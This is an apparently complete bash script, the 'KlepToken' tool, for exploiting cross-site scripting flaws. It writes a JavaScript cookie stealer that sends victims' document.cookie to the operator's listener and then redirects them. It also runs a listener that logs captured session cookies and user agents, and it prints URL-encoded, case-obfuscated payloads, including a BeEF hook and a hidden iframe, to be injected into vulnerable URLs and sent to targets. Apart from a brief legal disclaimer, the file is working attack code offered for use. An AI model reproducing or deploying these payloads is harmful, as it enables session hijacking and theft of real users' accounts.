#!/bin/bash

## KlepToken Copyright 2013, d4rkcat (d4rkcat@yandex.com)
#
## This program is free software: you can redistribute it and/or modify
## it under the terms of the GNU General Public License as published by
## the Free Software Foundation, either version 3 of the License, or
## (at your option) any later version.
#
## This program is distributed in the hope that it will be useful,
## but WITHOUT ANY WARRANTY; without even the implied warranty of
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
## GNU General Public License at (http://www.gnu.org/licenses/) for
## more details.

fhelp()
{
	echo $GRN"""
kleptoken$RST - Steal session cookies and redirect or Beef hook with XSS
	
Usage: kleptoken <options>

		-r <URL>  ~  Redirect/Iframe to URL (default ha.ckers.org)
		-o        ~  Just display obfuscated IP address and exit
		-l        ~  Use local IP address for payload (default)
		-e     	  ~  Use external IP address for payload
		-d <DDNS> ~  Use DDNS for payload
"
	exit
}

fexit()
{
	killall python 2> /dev/null&
	killall ncat 2> /dev/null&
	rm cook.log 2> /dev/null&
	rm server.log 2> /dev/null&
	rm sound.js 2> /dev/nul&
	rm button.js 2> /dev/null&
	rm form43.js 2> /dev/null&
	rm playsound.js 2> /dev/null&
	echo $RST
	if [ $NEW = 1 ] 2> /dev/null
	then
		echo $GRN" [*] Cookies saved to cookies.log"
		echo $RST
	fi
	exit
}

fserver()
{
	killall ncat 2> /dev/null
	sleep 1
	echo '' > server.log
	echo '' > cook.log
	sleep 0.5
	xterm -e 'ncat -l -p 19335 > cook.log'&
	sleep 0.5
	SERVED=''
	CSCR=''
	while [ $SERVED -z ] 2> /dev/null
	do
		if [ $(cat server.log  | grep form43 | wc -c) -gt 4  ] 2> /dev/null  
		then
			RHOST=$(cat server.log | tail -n 1 | cut -d '-' -f 1 | tr -d ' ')
			echo $BLU" [*] $RHOST redirected to $URL [$(date | cut -d ' ' -f 5)]"
			SERVED=1

		elif [ $(cat server.log  | grep button | wc -c) -gt 4 ] 2> /dev/null
		then
			RHOST=$(cat server.log | tail -n 1 | cut -d '-' -f 1 | tr -d ' ')
			echo $BLU" [*] Cookie stealer script served to $RHOST [$(date | cut -d ' ' -f 5)]"
			SERVED=1
			CSCR=1
		elif [ $(cat server.log  | grep playsound | wc -c) -gt 4 ] 2> /dev/null
		then
			RHOST=$(cat server.log | tail -n 1 | cut -d '-' -f 1 | tr -d ' ')
			echo $BLU" [*] Sound script served to $RHOST [$(date | cut -d ' ' -f 5)]"
			sleep 2 && fsound 2>/dev/null&
			SERVED=1
		fi
		sleep 1
	done
	if [ $CSCR = 1 ] 2> /dev/null
	then
		CNT=0
		DONE=''
		FAIL=''
		while [ $DONE -z ] 2> /dev/null
		do
			sleep 1
			CNT=$((CNT + 1))
			DONE=$(cat cook.log | grep GET)
			if [ $CNT -gt 7 ] 2> /dev/null
			then
				echo $RED" [*] Cookie script failed to return cookie [$(date | cut -d ' ' -f 5)]"
				FAIL=1
				break
			fi
		done
		if [ $FAIL = 1 ] 2> /dev/null
		then
			A=1
		else
			sleep 0.4
			USRAG=$(cat cook.log | grep User-Agent: | cut -d ':' -f 2-3 | tail -n 1)
			SURL=$(cat cook.log | grep Referer: | cut -d '/' -f 1-3 | tail -n 1 | cut -d ':' -f 2-3 | cut -d '/' -f 3)
			LHOST=$(cat cook.log | grep Host: | tr -d 'Host' | cut -d ':' -f 2 | tail -n 1)
			COOK=$(cat cook.log | grep dct7 | head -n 1 | tr '%' "\n" | cut -c 3-)
			echo $GRN" [*] Cookie to $SURL captured from $RHOST to $LHOST [$(date | cut -d ' ' -f 5)]"
			echo $GRN" [*] User Agent: $USRAG"
			if [ $(echo "$COOK" | grep SES) -z ] 2> /dev/null
			then
				A=1
			else
				echo $GRN" [*] Cookie: $(echo " $COOK" | grep SES)"
			fi
			echo $BLU" [*] $RHOST redirected to $URL [$(date | cut -d ' ' -f 5)]"
			cat cook.log >> cookies.log
			echo """
			   -------------------------------------------------------------
			" >> cookies.log
			NEW=1
		fi
	fi
}

fcook()
{
	echo 'var FormatXML = "http://'"$DWORD"':19335/";
	var today = new Date();            
	var expire = new Date();
	expire.setTime(today.getTime() + 2000);
	complete = false;
	padding="AAAAAAA";
	document.cookie="z="+padding+"; expires="+expire.toGMTString()+"; path=/;";

	function redirect(c)
	{
	  if(this.readyState == this.DONE) {
		window.location.href = "http://'"$URL"'"
	  }
	}

	function sendCookie(c)
	{
	  var xhr2 = new XMLHttpRequest();
	  xhr.onreadystatechange = redirect;
	  xhr.open("GET", FormatXML+"service?&dct7="+document.cookie,true);
	  xhr.send();
	}

	function grabCookie() {
	  if(!complete && this.responseText.length > 1) {
		c = document.cookie;
		sendCookie(c[1]);
		complete = true;
	  }
	}

	var xhr = new XMLHttpRequest();
	xhr.onreadystatechange = grabCookie;
	xhr.open("GET", document.domain+document.location.pathname);
	xhr.send();' > button.js
}

fsound()
{
	 RANDURLS="""BoobyTrap.wav
dangerousjob.wav
goodmorningVietnam.wav
crypt%20keeper%20laugh.wav
BITCH.WAV
Austin_Powers_danger.wav
humbug.wav
Austin_Powers_groovy.wav
austinmail2.wav
gameover.wav"
        RANDURLS="$(echo "$RANDURLS" | sort -R)"
        RAND=$(strings /dev/urandom | grep -o '[1-9]' | head -n 1 | tr -d '\n'; echo)
        RANDSOUND="http://www.villagegeek.com/downloads/webwavs/$(echo "$RANDURLS" | sed -n "$RAND"p)"

        echo 'function playSound(url) {
                function createSound(which) {
                window.soundEmbed = document.createElement("audio");
                window.soundEmbed.setAttribute("src", which);

                window.soundEmbed.setAttribute("style", "display: none;");
                window.soundEmbed.setAttribute("autoplay", true);

        }
                if (!window.soundEmbed) {
                        createSound(url);
                }
                else {
                        document.body.removeChild(window.soundEmbed);
                        window.soundEmbed.removed = true;
                        window.soundEmbed = null;
                        createSound(url);
                }
                window.soundEmbed.removed = false;
                document.body.appendChild(window.soundEmbed);
        }        
                        
        playSound("'"$RANDSOUND"'");' > playsound.js
}

fredir()
{
	if [ $SEC = 1 ] 2> /dev/null
	then
		echo 'window.location.href = "https://'"$URL"'"' > form43.js
	else
		echo 'window.location.href = "http://'"$URL"'"' > form43.js
	fi
}

fencip()
{
	if [ $EXTR = 1 ] 2> /dev/null
	then
		echo $GRN" [*] Retrieving External IP address, Please Wait.."
		echo $GRN" [*] Please make sure ports 8000, 19335 and 3000 are forwarded to your IP.."
		IP="$(curl -s ifconfig.me)"
		echo;echo $GRN" [*] Done: "$IP;echo
	else
		IP="$(ifconfig | grep $LAN -A 1 | grep Bcast | cut -d ':' -f 2 | tr -d Bcast | head -n 1)"
	fi
	DWORD1=$(echo $IP | cut -d '.' -f 1)
	DWORD2=$(echo $IP | cut -d '.' -f 2)
	DWORD3=$(echo $IP | cut -d '.' -f 3)
	DWORD4=$(echo $IP | cut -d '.' -f 4)
	DWORD=$((DWORD1 * 256 + DWORD2))
	DWORD=$((DWORD * 256 + DWORD3))
	DWORD=$((DWORD * 256 + DWORD4))            
	
	if [ $URL -z ] 2> /dev/null
	then
		URL='ha.ckers.org'
	fi
	if [ ${URL:0:5} = 'https' ] 2> /dev/null
	then
		URL=${URL:8}
		SEC=1
	elif [ ${URL:0:5} = 'http:' ] 2> /dev/null
	then
		URL=${URL:7}
	fi
	
	if [ ! -z $DDNS ] 2> /dev/null
	then
		if [ ${DDNS:0:5} = 'http:' ] 2> /dev/null
		then
			DDNS=${DDNS:7}
		fi
		if [ $(echo $DDNS | tail -c 2) = '/' ] 2> /dev/null
		then
			DDNS=$(echo $DDNS | head -c -2)
		fi
		DWORD=$DDNS
	fi
	
	STUFF="$(echo $DWORD | sed 's/\(.\)/\1\n/g')"
	fencstuff
	ENCIP=$ESTUFF
	STUFF="$(echo $URL | sed 's/\(.\)/\1\n/g')"
	fencstuff
	EURL=$ESTUFF
}

fencstuff()
{
	ESTUFF=''
	for CHAR in $STUFF
	do
		case $CHAR in
			0)ESTUFF=$ESTUFF'%30';;1)ESTUFF=$ESTUFF'%31';;2)ESTUFF=$ESTUFF'%32';;3)ESTUFF=$ESTUFF'%33';;4)ESTUFF=$ESTUFF'%34';;
			5)ESTUFF=$ESTUFF'%35';;6)ESTUFF=$ESTUFF'%36';;7)ESTUFF=$ESTUFF'%37';;8)ESTUFF=$ESTUFF'%38';;9)ESTUFF=$ESTUFF'%39';;
			"a")ESTUFF=$ESTUFF'%61';;"b")ESTUFF=$ESTUFF'%62';;"c")ESTUFF=$ESTUFF'%63';;"d")ESTUFF=$ESTUFF'%64';;"e")ESTUFF=$ESTUFF'%65';;
			"f")ESTUFF=$ESTUFF'%66';;"g")ESTUFF=$ESTUFF'%67';;"h")ESTUFF=$ESTUFF'%68';;"i")ESTUFF=$ESTUFF'%69';;"j")ESTUFF=$ESTUFF'%6A';;
			"k")ESTUFF=$ESTUFF'%6B';;"l")ESTUFF=$ESTUFF'%6C';;"m")ESTUFF=$ESTUFF'%6D';;"n")ESTUFF=$ESTUFF'%6E';;"o")ESTUFF=$ESTUFF'%6F';;
			"p")ESTUFF=$ESTUFF'%70';;"q")ESTUFF=$ESTUFF'%71';;"r")ESTUFF=$ESTUFF'%72';;"s")ESTUFF=$ESTUFF'%73';;"t")ESTUFF=$ESTUFF'%74';;
			"u")ESTUFF=$ESTUFF'%75';;"v")ESTUFF=$ESTUFF'%76';;"w")ESTUFF=$ESTUFF'%77';;"x")ESTUFF=$ESTUFF'%78';;"y")ESTUFF=$ESTUFF'%79';;
			"z")ESTUFF=$ESTUFF'%7A';;".")ESTUFF=$ESTUFF'%2E';;*)ESTUFF=$ESTUFF$CHAR
		esac
	done
}

fpayloads()
{
	fsound
	fcook
	fredir
	
    PAYLOAD='%3C%73%43%52%69%50%54%20%73%72%63%3D%2F%2F'
	fencip
	
	QPAYLOAD='3C%21%2D%2D'
	IPAYLOAD='%3C%69%46%72%41%4D%65%20%66%72%61%6D%65%62%6F%72%64%65%72%3D%30%20%68%65%69%67%68%74%3D%30%20%73%72%63%3D%2F%2F'$EURL'%20%77%69%64%74%68%3D%30%3E%3C%2F%69%66%52%61%4D%65%3E'
	BPAYLOAD=$PAYLOAD$ENCIP'%3A%33%30%30%30%2F%68%6F%6F%6B%2E%6A%73%3E%3C%2F%53%43%52%69%50%74%3E'
	CPAYLOAD=$PAYLOAD$ENCIP'%3A%38%30%30%30%2F%62%75%74%74%6F%6E%2E%6A%73%3E%3C%2F%53%63%52%69%50%74%3E'
	SPAYLOAD=$PAYLOAD$ENCIP'%3A%38%30%30%30%2F%70%6C%61%79%73%6F%75%6E%64%2E%6A%73%3E%3C%2F%53%63%52%69%70%54%3E'
	RPAYLOAD=$PAYLOAD$ENCIP'%3A%38%30%30%30%2F%66%6F%72%6D%34%33%2E%6A%73%3E%3C%2F%53%63%52%69%50%74%3E'
	PPAYLOAD='%3C%53%63%72%49%50%74%3E%61%6C%65%72%74%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%29%3C%2F%73%43%72%49%50%54%3E'
	RICKPAYL='%3C%69%66%72%61%6D%65%20%77%69%64%74%68%3D%31%30%30%30%20%68%65%69%67%68%74%3D%31%30%30%30%20%73%72%63%3D%2F%2F%79%6F%75%74%75%62%65%2E%63%6F%6D%2F%65%6D%62%65%64%2F%64%51%77%34%77%39%57%67%58%63%51%3F%61%75%74%6F%70%6C%61%79%3D%31%3E%3C%2F%69%66%72%61%6D%65%3E'
	SLPAYLOAD='%27%27%3B%21%2F%2F%27%3E%3B%2F%2F%22%3E%3B%2F%2F%2D%2D%3E%3B%2F%2F%22%2F%2F%3E%3C%3C%2D%2D%27%3E%2D%2D%22%3E%3C%2F%74%69%74%6C%65%3E%3C%2F%53%63%52%69%70%74%3E%3C%53%63%72%49%50%74%3E%61%6C%65%72%74%28%53%74%72%69%6E%67%2E%66%72%6F%6D%43%68%61%72%43%6F%64%65%28%38%38%2C%38%33%2C%38%33%29%29%3C%2F%73%63%72%49%50%54%3E'
}

fsetup()
{
	echo $BLU
	echo '                              ..,,,:::,:,:::~::?~                               
                       . .,~,:=8$+ODD8OOZZ7=?8?,,::~,O,                         
                     ,,::?Z8DNNDDDDDD8OOZ$7I?+=~::.D,::~7?                      
                  .,:,DZNNNNDDDNDDDD88OOZ$II?==~:,,.,..+::+O+                   
               .,,~DDNNNNDDNNDNNDD8888OZ$7I:+=~~:,,.......,:,ZI.                
             .,::DNNDDDNNNNNDNDDDDD888OZ=D7?Z=~~:,,,.,:~....,::8$               
            ,::DMDDDNDNDNNNNNDNDDDDD8OOZZ?Z?.D::,,,.,D..,.....~:?ZZ.            
           ,:8NNDDNNNNDNNNNNNNNDDDN+:Z~77~O,?OD:,,,..Z....:?7...::DI.           
         ~,=+NN=NNDNNNDDNNNNNDD7+7:+=:,~,==,?::$,,,......,...7...7,,I=.         
       .::DND=NN:$NNNNDNNO,,=?,I:~=,~:.D=:,:I+I8,,.......~..I......~:O=         
      .::DNNZ:8NN~+NNDN~Z$?~,:+,:~~II,.$,=,~+,=~:~,:$........,=..,..:~O$ .      
      ,,DDDNND=~8DDNN,~~,:,?=::+:++O?87+~=,,?,,::=~7I$.......$..,$...::D$.      
     ,,DNNNNNNN?NDDNI,Z:?,?:Z?~I,~.$+,=,=:,7:,$?+~+~IZ,.......?+...,..~~87      
   .::DNZMNNNNNDDDD~I~+,:+,?I=~~~=+$I~+:~,::,D+,,II???............,?=..,:O=     
  .:,8NNNO:?~NDDNDN+I,,.+,=++I:~~,7=:=,+:?~~,~?::~~?O...........=,+..Z.,:,I=    
  .,8+N,I+DNNNNDND:I:=~7~,~,OZ=$?.,,~++~~.::,,$~=::+ID...........~I.....I:8I..  
  7,DNNNDO:INDNNN7=~=~,?87O=,+O,,I?7II??~~?:=,,,,,:=+$~..........,.......,:Z~   
 .,ZDN?NNDDNNDDDN++~,:O:::?,O,+=?==$=?I+=~7~+:?,,,::=+D...................:?+=. 
 ?,DN,?:~,NNNNDN?,+:IZ$?+~~II,:=78I?=,~::,,:::,,::,~~?Z...................~:O~  
 ,D=DNDNN+DDNNDN87~+?$:~:Z:,~I:+?:7===,IZ:I::,,,,,,+=~$8.............=+...::D~= 
8,DM~~NNODDNNDDND=:~:I,I??7=:~~~~7:I+$I+7~~I:,,,,,:777=....................:+7~.
?:DN7NZN=DNDDNDNND+I++=8I~=++=~+?+:7$,?:=I===,,,:=+8~,+............., .7,..:::~.
.?ZD7N??$DDDNNDDDDD+~7==~+=,~?=7~I~ZO::$++=I,,::+=~:I,,:.............::....+~O=.
.8?NNDN8DDNNDNDDDD~=$?=?O:+Z=?I~=+::+::,~,?:,,,::=~=7=,,:D.................=~O~.
,Z?D?+=D$DDDDNDDDD=$,,:+=II=Z=:::$7==:I?.,,,,,,,,,:~+?I:,~8..........,::~I.=~D~.
,Z?N==~~ONDDNDDDDI7??+:?=::==:~+=O~~IZ::,,,,,,,,,,::=$,,,~O=.........Z.....~~D~.
,8+NDDNDNNDNNDDDD?~7=:~+?+II7~77~~+=Z,+,,:,,:,,,,:,:+8Z,8..................?:8~.
.I?DNN:,7DDDDDDD8+?I~~+~:??+++I,:+:?I:+O,,,,:,,,,,:~Z=:~7............?.....I~?~ 
~=DD?I$I7DDDDDDD888=$77I=:~:=,==~+$,:.,8,,:,,:,,,::+I:~:Z..............=...,,7~.
N:8NNDND?DDDD8OO88OO$+7I7~~+:++=.?,,=~,=,,::,,~,:~~O,~,7+...........?=.... :O~~.
:,NODDNN=7DDOOOZZZZO7+=,:~==~$O+~,,,=~,,:+:,:,,:,=+Z,:+8..................7=D~~ 
 ,.8D:::=,DDOZ8O$$OII7?I~~,7,:~,,,,,=+:,+,,,==,,:~=~~~7............I~:....,~+~. 
 O,8DD+DDD8OZZZ$7I7$++=~~~:=,,,,,,,,~:,~::+,,=::=I,:~+8.............,:+,.~:O=:  
  ~.IDDD88,+Z$$7$II?+?~=~::,=,:~+:,=::~+~:+:~+=?~~=ZZO..............:,:..,:O=   
  ,,DO8:$ZOZ7777I?++=~~::,,,::,::,,:,~:~==+~::=:,,...............O......+~8?    
   N:8OOZZ$$,7I??+==~:::,,,:,:,,:::,::::~+?~,8.,................O,,+....~?$=    
   .,.8Z$$77:I++=~~=::,+ON8I,,,=:,::+~~==I==Z,..~...............O...7..::$+     
     .:D7~::+=..~::,+,,.==....$$=:::=~==~++,..................$.,,,$..:~Z=      
     .,,O??I=.?~8:~==,,..........IZ~+:,=~=?O.:~..,...~.:.....,.. ....::O~.      
      .,,8=IO:=8,,...,....... =:.,..OO,=~=?8.:=..,..~=.==..... .,,..,:8?        
       .,~8~:,::~,..=...==......,7,.~.~D:~7O.:~..,...~.~..........,::O$.        
        .N:7,:,,,..~.....~~....:....=,,~.O?$.:=..,,=.:.:.=.......:=7OZ.         
          ~.,D,,,..............................................,::8O.           
           .N,,D..............7,8...,....,,..:.:I.............,:8Z7.            
              D:,Z..............8.,8.,..=.,Z.,:.=...........,,ZZ7               
                $:,O..........,O..,,.,..~..+...,8........~:,ZOO..               
                ..D,,,Z.....+,:,..,,.~.....8...?,.....::~,8Z7                   
                    .M.:,+=........,=....,........:,::,8OO.                     
                        :D:,,,:~~,..........::,:::,888.                         
                            ..ND=,,::::::,:,=888Z..                             
'
echo $RED'                            
		 _  __ _            _______      _                
		| |/ /| |          |__   __|    | |               
		|   / | |  ___  _ __  | |  ___  | | __ ___  _ __  
		|  <  | | / _ \|  _ \ | | / _ \ | |/ // _ \|  _ \
		| . \ | ||  __/| |_) || || (_) ||   <|  __/| | | |
		|_|\_\|_| \___|| .__/ |_| \___/ |_|\_\\___||_| |_|
			       | |                                
			       |_|          By d4rkcat..
			       
			       '
    sleep 2          
	touch cook.log
	ROUTE=$(route -n | grep Gate -A 1 | grep 0.0 | cut -d 0 -f 5 | tr -d ' ')
	LAN=$(echo $ROUTE | cut -d '.' -f 1-3)'.'
	NIC=$(ifconfig | grep $LAN -B 1 | cut -d ' ' -f 1 | head -n 1)
	if [ $PWD = "/" ] 2> /dev/null || [ $PWD = "/root" ] 2> /dev/null || [ $PWD = $HOME ] 2> /dev/null
	then
		echo $RED" [*] Please run this script from an empty directory, for your security!"
		echo $RST
		exit
	fi

	if [ $(cat $HOME/kleptoken_check | grep user_has_agreed) -z ] 2> /dev/null
	then
		echo $RED" [*] DO NOT USE THIS TOOL ON WEBSITES OR USERS UNLESS EXPLICITLY AUTHORIZED TO DO SO."
		echo $RED" [*] BY USING THIS TOOL YOU AGREE NOT TO BREAK ANY LOCAL OR FEDERAL LAWS WHILE USING THIS TOOL."
		echo $RED" [*] THE AUTHOR IS NOT RESPOSIBLE FOR ANY LOSS OR DAMAGES CAUSED BY THIS TOOL.";echo
		read -p " [>] Do you agree? [y/n]:" USE
		if [ $USE = 'y' ] || [ $USE = 'Y' ]
		then
			echo 'user_has_agreed' > $HOME/kleptoken_check
			clear
		else
			echo 'user_has_not__agreed' > $HOME/kleptoken_check
			echo $RST
			exit
		fi
	fi
}

fmenu()
{
	echo $BLU" [*] Choose a Payload below, enter into your URL where the XSS is located and send to target:"
	echo ' [>] eg. http://www.badsite.com/nogood.php?id=">'$RED"[PAYLOAD]";echo
	echo $BLU" [*] Social Engineering Payloads:";echo
	echo $GRN" [*] Steal Cookie and Redirect to $URL:";echo $BLU"	<sCRiPT src=//$DWORD:8000/button.js></ScRiPt>"; echo $RED" $CPAYLOAD";echo
	echo $GRN" [*] Redirect to $URL:";echo $BLU"	<sCRiPT src=//$DWORD:8000/form43.js></ScRiPt>";echo $RED" $RPAYLOAD";echo
	echo $GRN" [*] Invisible iframe to $URL:";echo $BLU"	<iFrAMe frameborder=0 height=0 src=//$URL width=0></ifRaMe>";echo $RED" $IPAYLOAD";echo
	echo $GRN" [*] Hook to Beef: (Check Beef ui to see targets)";echo $BLU"	<sCRiPT src=//$DWORD:3000/hook.js></SCRiPt>";echo $RED" $BPAYLOAD";echo
	echo $BLU" [*] Testing Payloads:";echo
	echo $GRN" [*] Play Sound:";echo $BLU"	<sCRiPT src=//$DWORD:8000/playsound.js></ScRipT>";echo $RED" $SPAYLOAD";echo
	echo $GRN" [*] Rick Roll:";echo $BLU"	<iframe width=1000 height=1000 src=//youtube.com/embed/dQw4w9WgXcQ?autoplay=1></iframe>";echo $RED" $RICKPAYL";echo
	echo $GRN" [*] Alert box with cookie:";echo $BLU"	<ScrIPt>alert(document.cookie)</sCrIPT>";echo $RED" $PPAYLOAD";echo
	echo $GRN" [*] XSS locator:";echo $BLU"	[FILTERBP]</title></ScRipt><ScrIPt>alert(String.fromCharCode(88,83,83))</scrIPT>";echo $RED" $SLPAYLOAD";echo
	echo $GRN" [*] Comment out some html:";echo $BLU"	<!--";echo $RED" $QPAYLOAD";echo $BLU
}

fdispip()
{
	fencip
	if [ $EXTR = 1 ] 2> /dev/null
	then
		echo $DWORD$RST" (external)"
		echo
	else
		echo $DWORD$RST" (internal)"
		echo
	fi
	exit
}

GRN=$(echo -e "\e[1;32m")
RED=$(echo -e "\e[1;31m")
BLU=$(echo -e "\e[1;36m")
RST=$(echo -e "\e[0;0;0m")

trap fexit 2
fsetup

ACNT=1																	#Parse command line arguments
for ARG in $@
do
	ACNT=$((ACNT + 1))
	case $ARG in "-o")fdispip;;"-h")fhelp;;"--help")fhelp;;"-e")EXTR=1;;"-r")URL=$(echo $@ | cut -d " " -f $ACNT);;"-d")DDNS=$(echo $@ | cut -d " " -f $ACNT);esac
done

fencip
fpayloads
fmenu
python -m SimpleHTTPServer 2> server.log&
while [ true ]
do
	fserver
done
